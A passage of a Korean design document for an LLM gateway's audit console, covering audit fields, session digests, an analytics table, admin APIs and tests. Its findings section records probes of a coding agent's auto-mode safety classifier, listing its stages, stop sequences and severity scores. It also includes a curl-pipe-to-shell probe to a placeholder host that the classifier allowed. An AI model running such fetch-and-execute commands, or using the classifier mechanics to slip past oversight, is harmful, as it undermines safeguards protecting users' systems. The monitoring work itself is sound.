    Stage     string `json:"stage"`     // s1 | s2 | server
    Signature string `json:"signature"` // 예: "claude-code-2.1"
}
// Record 끝에 추가:
//   Attempts []AttemptRef `json:"attempts,omitempty"`
//   Client   *ClientRef   `json:"client,omitempty"`
//   AutoMode *AutoModeRef `json:"auto_mode,omitempty"`
```

- `attempts`는 최대 8개입니다(더 길면 앞의 7개와 마지막 1개). `request_completed`
  기록에만 붙습니다.
- `attempts`가 2개 이상이면 `outcome.fallback_used`를 `true`로,
  `outcome.fallback_chain`을 시도한 provider 순서로 채웁니다. 두 필드는 이미
  문서화된 wire 형식이지만 지금까지 한 번도 채워지지 않았습니다. 옛 기록은 바뀌지
  않습니다.
- 요청의 마지막 기록(완료, 또는 outcome이 붙은 시작 기록)에는 요청 시작부터 잰
  `latency{total_ms, ttft_ms}`와 `client`를 붙입니다. 지금까지 `latency`는
  Responses 경로만 기록했습니다(`internal/server/responsesapi/observe.go:119`).
- 시도 목록은 context helper가 관리합니다: `audit.WithAttemptLog(ctx)`,
  `audit.BeginAttempt(ctx, provider, model) func(status string, http int)`,
  `audit.AttemptsFrom(ctx)`. 동시 접근에 안전하고, `RoutingFrom`처럼 기록을 만들
  때 복사합니다.

### 요청 경로 수집 (`internal/server`, 모든 ingress 패키지)

- **클라이언트 정보.** helper 하나(`clientctx.FromRequest(r, keyID, mode)`)가
  모든 ingress에서 두 헤더를 읽습니다. `request_class`는 알려진 6개 값일 때만
  남깁니다. 세션 ID는 `[A-Za-z0-9._:-]` 1–128바이트일 때만 받고,
  `session_ref = "s1:" + hex(sha256("inferplane-session-v1\x00" + key_id + "\x00" + id)[:16])`
  를 만듭니다. 그 밖의 값이면 `session_ref`가 없습니다. 원문은 저장·로그·label
  어디에도 남기지 않습니다.
- **시도.** 모든 fallback 루프(Messages, Chat, Invoke, Converse, Responses)가
  dispatch 전에 `BeginAttempt`를 부르고 닫힌 상태값으로 끝냅니다. dispatch 전에
  거부된 요청은 시도가 없습니다.
- **auto mode 판정기.** Anthropic Messages 형식 응답(Messages·Invoke ingress)이고
  판정기가 켜져 있을 때만 동작합니다. assistant 텍스트의 앞 16 KiB까지만 읽고
  (비 stream 본문 또는 stream의 text delta), 텍스트를 저장하지 않으며, 응답
  바이트를 바꾸지 않습니다. 무엇을 기록하는지는 "먼저 확인한 결과"의 "그에 따른
  결정"이 정합니다. 모호하지 않게 해석되지 않는 block 호출과 서버 safeguard는
  `inferplane_audit_auto_mode_unparsed_total`(label 없음)을 올리고
  `verdict: unknown`으로 기록합니다. `</severity>` 호출과 `<severity>`로 끝나는
  추론 응답은 기록도 집계도 하지 않습니다.

### 설정

```json
"audit": {
  "client_evidence": { "session_ref": "key_scoped", "auto_mode": "on" }
},
"otel": { "trace_link_template": "https://grafana.example/explore?traceId={trace_id}" }
```

- `session_ref`: `key_scoped`(블록이 없을 때 기본) 또는 `off`.
- `auto_mode`: `on`(기본) 또는 `off`.
- `trace_link_template`: 선택. `http`/`https`가 아니거나 `{trace_id}`가 없으면
  `config validate`가 거부합니다. `/admin/capabilities`로 전달하고, 콘솔은 hex
  32자 `trace_id`를 넣어 새 탭으로 엽니다. CSP는 바꾸지 않습니다.

### 감사 이벤트 투영 (`internal/analytics`, `pgstore`)

콘솔은 같은 analytics 인덱스(Mode A는 SQLite, Mode B는 Postgres)에 새로 만든
`audit_events` 표를 읽습니다. 기존 `events` 표와 사용량 화면의 의미는 바뀌지
않습니다.

- **대상 기록:** 요청의 마지막 기록 전부입니다. `request_completed`와,
  `outcome`이 붙은 `request_started`입니다. gateway 거부는 모두 뒤의 형태로
  기록됩니다(`internal/server/anthropicapi/messages.go:736-753`).
  `analytics.Observable`이 `request_completed`만 받으므로 `events`에는 거부가
  들어가지 않습니다(`internal/analytics/evidence.go:32`). 허용된
  `request_started`와 admin 이벤트는 건너뜁니다.
- **열:** `id`, `ts`, `ts_ms`, `event`, `kind`, `team`, `key_id`, `ingress`,
  `stream`, `status`, `deny_code`, `routing_reason`, `privacy`, `masked`,
  `would_restrict`, `pii`, `policy_ref`, `planned_boundary`,
  `actual_boundary`, `request_class`, `session_ref`, `trace_id`,
  `model_requested`, `model_actual`, `provider`, `fallback`, `attempt_count`,
  `auto_verdict`, `auto_stage`, `auto_signature`, `input_tokens`,
  `output_tokens`, `cost_micros`, `total_ms`, `ttft_ms`, `has_body`,
  `record_json`. 표 `audit_event_categories(id, category)`. 인덱스 `ts_ms`,
  `(kind, ts_ms)`, `(key_id, ts_ms)`, `(session_ref, ts_ms)`.
- **멱등:** 기록 ULID를 키로 `ON CONFLICT DO NOTHING`.
- **범위:** Mode A는 실시간 감사 sink와, 부팅 때 설정된 file sink replay로
  표를 채웁니다. 어느 file sink에도 없는 기록은 표에 들어가지 않으므로, 콘솔은
  전부라고 주장하지 않고 가장 오래된 기록 시각을 보여줍니다. Mode B는
  aggregator가 이미 읽는 감사 세그먼트로 채웁니다.
- `record_json`은 감사 줄 그대로입니다. 상세 화면은 이것을 읽으므로 감사 파일이
  회전되어도 깨지지 않습니다. 이 사본이 조작되면 체인에 대한
  `mayu audit verify`로 드러납니다.
- **kind 판정** (처음 맞는 것):
  1. `auto_mode_blocked`: `auto_mode.verdict == block`
  2. `privacy_blocked`: status ≥ 400이고 (`routing.privacy == block`이거나,
     코드(`outcome.error`, 없으면 `routing.reason`)가 `sensitive_blocked`,
     `mask_failed`, `masking_failed` 중 하나)
  3. `policy_denied`: status ≥ 400이고 코드가 `audit.DenyReason` 값이거나
     `model_forbidden`, `no_safe_route`, `budget_target_changed`,
     `budget_authority_unavailable` 중 하나
  4. `upstream_error`: 그 밖의 status ≥ 400, 또는 `partial`. context 초과 같은
     gateway 쪽 요청 오류도 여기에 들어가므로, 콘솔에서는 이 kind를 “업스트림 오류”가
     아니라 “오류”로 표시합니다.
  5. `privacy_masked`: `routing.masked` 또는 옛 `request.pii_masked`
  6. `privacy_internal`: `routing.privacy == internal_only`
  7. `ok`
- `events.error_code`의 의미는 그대로 두고, `audit_events.deny_code`를 따로 둡니다.

### admin API (`internal/server/auditconsoleapi`, analytics와 함께 마운트)

모든 경로: `AdminAuth` + `requireAdmin`. analytics 인덱스가 켜졌을 때만
마운트하고, `/admin/capabilities`에 `audit_console: bool`과
`trace_link_template`(설정이 없으면 빈 값)을 추가합니다.

| 경로 | 용도 |
|---|---|
| `GET /admin/audit/events` | 필터: `kind`(쉼표 목록), `team`, `key_id`, `model`, `provider`, `code`, `category`, `class`, `session`, `trace_id`, `since`, `until`(RFC 3339, 기본 최근 24시간, 최대 366일). `limit` ≤ 200, `before` = id keyset |
| `GET /admin/audit/events/{id}` | 요약 행, 저장된 감사 기록, 파생 waterfall 행 |
| `GET /admin/audit/sessions` | 세션 목록: 처음·마지막 시각, 요청, 비용, 거부, PII, auto mode 차단, subagent 수 |
| `GET /admin/audit/sessions/{ref}` | 세션 하나의 요청을 시간순으로, `limit` ≤ 500, keyset |
| `GET /admin/audit/summary` | kind별 건수, 상위 PII category, PII 처리, 거부 코드별 범위·마지막 시각, auto mode 판정·차단·판정 불가, 카드마다 12개 시간 구간 |

- 잘못된 파라미터는 `400`과 `invalid_kind`, `invalid_limit`, `invalid_cursor`,
  `invalid_range`, `invalid_filter` 중 하나를 돌려줍니다.
- 콘솔 표에 없는 ID는 `404 not_found`를 돌려줍니다.
- 문자열 필드는 닫힌 집합이거나 감사 기록 자체에서 옵니다. 세션 ID 원문, 비밀,
  키 평문은 애초에 돌려줄 데이터가 없습니다.
- 정책 이름과 rule은 라우팅 거부에서만 보입니다(`routing.policies`에 있음).
  거버넌스 거부는 감사 기록에 정책 이름이 없으므로 코드와 범위(팀, 키, 사용자)만
  보여줍니다.

### 콘솔 (`internal/server/adminui`)

- 새 `static/audit.js`(`evaluation.js`와 같은 방식), **로그** 다음에 **감사**
  메뉴, 네 언어의 i18n 키, `style.css` 스타일. Observability 자리 표시 메뉴는
  넣지 않습니다. 하위 프로젝트 B가 자기 메뉴를 추가합니다.
- 상단: 기간·팀·키 필터(키에는 이름 필드가 없으므로 `metadata.name`이 있으면 그것을,
  없으면 `key_id`를 보여줌),
  `/admin/analytics/health`의 인덱스 최신성, 기존 `/admin/audit/verify`를 부르는
  "체인 검증" 버튼.
- 카드: 요청, 정책 거부, PII 탐지, auto mode 차단(점선 "추정" 배지), 카드마다
  12구간 sparkline.
- 탭은 목업과 같습니다: Traces(kind 칩, 표, 상세), 세션, PII, 거부 이력. 확정
  근거는 실선 배지, 추정은 점선 배지입니다.
- 상세: waterfall, 행위자(감사 기록·키 저장소 배지, Virtual keys의 해당 키로
  이동), 세션, provider, 토큰, 비용, PII·거부 근거, auto mode 판정, 본문 버튼
  (`body_ref`가 있고 본문 저장이 켜졌을 때만), `trace_id`와 선택적 외부 링크,
  `hash`/`prev_hash`는 체인 위치로만 표시하고 "검증됨"이라고 하지 않습니다.
- 빈 상태·저하 상태: 인덱스 꺼짐(다른 섹션처럼 활성화 안내 카드), 인덱스 지연
  배너(Mode A는 재시작 시 file sink replay, Mode B는 rebuild), 기록 범위 시작 시각, 키 저장소에 없는 키, 본문 만료·캡처 꺼짐, auto
  mode 관측 안 됨, 판정 불가가 늘 때 서명 불일치 경고. 이 화면은 브라우저 저장소에
  아무것도 남기지 않습니다(ADR-001 데이터 없는 콘솔).

## 보안과 개인정보

| 항목 | 규칙 |
|---|---|
| 세션 ID | digest만, 키 범위, 도메인 분리. metrics·로그·API 출력에 없음. `off` 스위치 |
| 연결 가능성 | digest는 한 키 아래 한 세션의 요청을 묶습니다. 감사 근거일 뿐 권한 판단에는 쓰지 않습니다 |
| auto mode | 판정·단계·서명만. 응답 텍스트는 저장하지 않음 |
| 시도 | provider 이름과 닫힌 상태값. URL·업스트림 오류 원문 없음 |
| 접근 | full-admin 전용. 팀 admin은 403과 `admin_denied` 기록 |
| 본문 | 기존 ADR-018 경로와 `body_accessed` 그대로 |
| metrics | label 없는 카운터 하나만 추가. `key_id`·세션·identity label 없음 |

## 테스트

- **감사:** 새 필드가 없는 기록이 변경 전후로 바이트가 같은지 golden 테스트,
  옛 기록과 새 기록이 섞인 체인 검증, `fallback_used`/`fallback_chain`이
  `attempts`를 따르는지.
- **ingress(다섯 경로 모두):** 503→200 fallback이면 시도 2개, dispatch 전
  거부면 0개, 같은 세션 ID라도 키가 다르면 ref 2개, 집합 밖 class는 버림, 세션 ID
  원문이 감사 줄·`/metrics`·수집한 로그에 없음.
- **auto mode 판정기:** block 호출(단계 `s1`), 서버 safeguard(단계 `server`,
  알 수 없는 status·outcome과 빈 `tool_uses` 포함), auxiliary 전용 전체 규칙(단계
  `s2`), `</severity>`·`<severity>` 응답은 기록하지 않음, `<thinking>` 안의
  `<block>`, 서로 다른 block, 잘못된 stop sequence, stream delta, 16 KiB 한도,
  class 헤더가 없는 요청을 표로 테스트합니다. fixture는 실제 2.1.312 캡처에서 비밀을 빼고
  만듭니다.
- **인덱스:** replay가 완료·거부 기록을 투영, 재수집 멱등, kind 표, category 표.
  SQLite는 항상, Postgres는 `INFERPLANE_TEST_PG_DSN`이 있을 때.
- **admin API:** 필터, keyset 페이지, 400 코드, 없는 ID의 404, 401/403,
  capability 값.
- **콘솔:** `testdata/audit_console.cjs` Node 검사(렌더링 규칙, 배지, 빈 상태),
  `adminui_test.go`의 i18n 키 일치, 1280px·390px Playwright 검사(가로 넘침 없음,
  콘솔 오류 없음).
- **실제 환경(이 EC2):** 다른 포트의 테스트 `mayu`와 테스트 설정, Bedrock 모드와
  Anthropic 모드의 실제 Claude Code(auto mode), 처음에 503을 주는 로컬 stub
  provider, RPM 1인 키, 마스킹 privacy 규칙, 테스트 콘솔에 대한 Playwright.

## 먼저 확인할 항목

1. Claude Code 2.1.312가 Bedrock 모드와 Anthropic 모드에서 사용자 지정 base
   URL로 `X-Claude-Code-Session-Id`와 `x-claude-code-request-class`를 보내는지
   (테스트 gateway에서 캡처). 어떤 모드에서 보내지 않으면 그 모드에서는 세션·class
   데이터가 없고, UI가 그렇게 표시합니다.
2. 2.1.312의 auto mode 분류기 호출 모양: stream 여부, stop sequence, 단계 구분.
   어떤 메인 모델이 서버 판정을 쓰는지(그 세션에서는 분류기 호출이 생기지 않음).
3. 서버 판정이 메인 InvokeModel 응답에 안정적이고 해석 가능한 형태로 나오는지.
   그렇다면 계획에 단계 `server`를 추가할 수 있고, 아니면 한계로 문서화합니다.

## 먼저 확인한 결과 (2026-10-29)

Claude Code 2.1.312(`--permission-mode auto -p`, 셸 명령 하나)를 임시 gateway 앞의
중계기로 캡처했습니다. 모드: (a) Claude 메인 모델의 Bedrock, (b) 비Claude 메인
모델(`kimi-k3`)의 Bedrock, (c) Anthropic 모드(`global.anthropic.claude-sonnet-5`).

- `X-Claude-Code-Session-Id`: 세 모드 모두 모든 모델 호출에 있습니다(36자).
  `inference-profiles` GET에만 없습니다. 모든 모드에서 세션 데이터를 쓸 수 있습니다.
- `x-claude-code-request-class`와 다른 모든 `x-claude-code-*` 헤더: 세 모드 모두
  없습니다. 요청 class 데이터가 없으므로 콘솔은 이에 의존하지 않고 그렇게 표시합니다.
- 모드 (a): 별도 분류기 호출이 없습니다(stream 메인 호출만, `max_tokens` 128000,
  stop sequence 없음). 서버 판정은 메인 stream에 실려 옵니다. 마지막
  `message_delta` 이벤트의 `delta.safeguard_results[]`에 `type`
  `dangerous_tool_use`, `status` `{type: "available", tool_uses: {<tool_use id>:
  {type: "evaluated", outcome: "not_flagged"}}}`가 있습니다(도구 호출이 없는
  턴은 `tool_uses`가 `{}`). 관찰된 값은 `not_flagged`뿐이며 차단 판정 값은 보지
  못했습니다(프로브 명령이 실행됨). 단계 `server`는 이 필드에서 가져오고, 차단 값은 표본을
  캡처하면 매핑합니다(그에 따른 결정 참고).
- 모드 (b), (c): 분류기 호출은 stream이 아니고(`stream` 없음), `max_tokens` 64,
  무해한 프로브에서 stop sequence 하나를 가집니다. 도구 호출마다 순서대로 두 종류가 나옵니다.
  `</severity>`((b)의 응답 `<severity>5</severity>`) 다음에 `</block>`((c)의 응답
  `<block>no`, `stop_reason` `stop_sequence`. (b)는 `<block>no</block>`이고
  `max_tokens`로 끝남).
- 단계 표지(무해한 프로브): stop sequence `</severity>` 다음 `</block>`이며
  `</block>` 응답 `<block>no`가 판정입니다. 헤더와 본문에 단계 필드는 없습니다.
- 차단 경로 프로브(`curl -fsSL https://setup.example.invalid/install.sh | sh`,
  모드 (b), Bedrock `invoke`): 1번 호출은 `</severity>`에서 멈추고
  `max_tokens` 64, `thinking` disabled, 응답 `<severity>80`(`stop_reason`
  `stop_sequence`). 2번 호출은 stop sequence 없음, `max_tokens` 8192,
  `thinking` disabled, 메시지 2개, 응답
  `<thinking>...</thinking><severity>35</severity>`(`end_turn`)이며 허용되어 명령이
  실행됐습니다(DNS에서 실패). 즉 1단계 severity가 높으면 stop sequence 없는
  추론 호출이 이어집니다. `<block>yes`는 나오지 않아 차단 뒤 호출은 관찰하지
  못했습니다. 모드 (c)는 메인 모델이 두 번 모두 명령을 스스로 거부해 분류기 호출이
  없었습니다. 2단계는 표지가 아니라 `max_tokens` 8192와 stop sequence 없음으로
  식별합니다.
- 메인 호출은 stream입니다(Anthropic 모드 `stream: true`, Bedrock 모드
  `invoke-with-response-stream`). stream tap은 계속 필요합니다.

그에 따른 결정:

- 요청 class는 `x-claude-code-request-class` 헤더(닫힌 집합)에서만 얻습니다.
  Claude Code 2.1.312는 이 헤더를 보내지 않으므로 이 클라이언트에서는
  `request_class`가 없고, 콘솔은 class가 보고되지 않았다고 표시합니다. 본문으로
  추정하지 않습니다.
- auto mode 판정기는 `request_class == auxiliary`를 요구하지 않습니다. 모호하지
  않게 해석되는 것만 기록합니다.
  1. block 호출: stop sequence에 `</block>`이 있는 요청. 판정은 `<thinking>`을 지운
     뒤 일관된 `<block>yes|no`가 정확히 하나일 때이며, 응답이 `</block>`에서
     멈췄거나 텍스트가 `</block>`을 직접 닫을 때 받아들입니다. 단계 `s1`. 그
     외에는 `unknown`이고 unparsed 카운터를 올립니다.
  2. 서버 safeguard: `safeguard_results[]`에 `dangerous_tool_use` 항목이 있는
     Anthropic 형식 응답(Messages 또는 Invoke, 완전 응답 또는 stream).
     `status.type`이 `available`이고 모든 `tool_uses` 항목이 `{type: evaluated,
     outcome: not_flagged}`이면 `allow`입니다. 그 밖의 status나 outcome 값은
     `unknown`이고 카운터를 올립니다. `tool_uses`가 비어 있으면 기록하지
     않습니다. 단계 `server`.
  3. 단계 `s2`(stop sequence 없는 `<thinking>` 응답)를 포함한 전체 텍스트 규칙은
     `request_class == auxiliary`일 때만 동작합니다. 2.1.312에서는 쓰이지 않고,
     헤더를 보내는 클라이언트를 위해 둡니다.
  4. `</severity>` 호출과 `<severity>`로 끝나는 추론 응답은 기록하지 않습니다.
     block 판정이 없고 임계값도 모릅니다.
  signature는 셋 모두 `claude-code-2.1`입니다. 2.1.312에서는 모드 (b)의 높은
  severity 차단과 실제 서버 `flagged` 결과가 캡처 표본으로 매핑하기 전까지
  `unknown`(과 카운터)으로만 보입니다.
- 단계 값은 `s1`, `s2`, `server`이고, 앞서 둔 `fast` 자리표시자는 뺍니다.

## 범위 밖

- 하위 프로젝트 B: OTel 내보내기 대시보드, exporter·규칙 편집
- 거버넌스 거부의 정책 이름과 rule(새 거버넌스 필드가 필요함)
- 팀 범위 admin 화면, 외부 백엔드 조회, 기록 단위 체인 증명
- subagent를 부모 agent와 잇기(`x-claude-code-agent-id`)
- 인덱스 보존 정책
